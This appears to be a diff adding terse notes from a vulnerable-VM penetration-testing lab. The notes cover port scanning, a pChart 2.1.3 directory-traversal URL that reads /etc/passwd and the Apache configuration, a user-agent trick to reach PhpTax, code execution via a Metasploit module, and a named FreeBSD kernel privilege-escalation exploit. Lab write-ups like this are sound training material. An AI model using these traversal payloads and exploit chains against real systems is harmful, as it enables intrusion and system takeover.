@@ -1,0 +1,63 @@
+1. Enumenation
+nmap -sS -A 
+
+22/tcp   closed ssh
+80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
+8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
+#web server - Apache httpd (HTTP deamon) ver. 2.2 release 2.2.21 (not supported)
+#web servers: Apache, nginx, IIS (Microsoft) - most popular
+#OS - FreeBSD
+#mod_ssl - optionale module for the Apache HTTP Server
+#OpenSSL - secure library
+#DAV - WebDAV - file management protocol
+#PHP - scripting language
+
+1.1 dirb
+#nothing
+1.2 nikto
+#nothing
+1.3 page source
+<META HTTP-EQUIV="refresh" CONTENT="5;URL=pChart2.1.3/index.php">
+#pChart - PHP charting library
+
+v.1.3 ver. "pChart"
+1. searchsploit
+pChart 2.1.3 - Multiple Vulnerabilities   
+
+http://192.168.195.138/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd
+
+#lets find apache config (OS - FreeBSD)
+/usr/local/etc/apache2x/httpd.conf
+
+#
+/etc/apache2/apache2.conf
+
+http://192.168.195.138/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2f/usr/local/etc/apache22/httpd.conf
+
+#interesting
+<Directory "/usr/local/www/apache22/data2">
+    Options Indexes FollowSymLinks
+    AllowOverride All
+    Order allow,deny
+    Allow from env=Mozilla4_browser
+</Directory>
+
+#useragent Mozilla4
+Mozilla/4.0 (compatible; MSIE 4.01; Windows NT 5.0)
+#change useragent
+http://192.168.195.138:8080
+#phptax - linux tax program
+
+#searchsploit
+PhpTax - 'pfilez' Execution Remote Code Injection (Metasploit)  
+
+#use metasploit
+#we in
+umane -a
+
+FreeBSD 9.0
+
+#searchcploit
+FreeBSD 9.0 - Intel SYSRET Kernel Privilege Escalation 
+
+
